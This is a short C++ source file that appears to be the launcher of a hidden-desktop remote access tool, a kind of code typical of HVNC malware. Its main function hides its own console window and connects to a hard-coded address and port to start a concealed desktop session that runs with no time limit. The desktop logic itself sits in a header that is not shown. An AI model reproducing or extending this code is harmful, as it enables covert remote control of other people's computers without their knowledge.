#include "HiddenDesktop.h"
#include <Windows.h>

#define TIMEOUT INFINITE

void StartAndWait(const char* host, int port)
{
    InitApi();
    const HANDLE hThread = StartHiddenDesktop(host, port);
    WaitForSingleObject(hThread, TIMEOUT);
}

#if 1
int main()
{
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
    const char* host = "192.168.5.1";
    const int port = strtol("138", nullptr, 10);
    StartAndWait(host, port);
    return 0;
}
#endif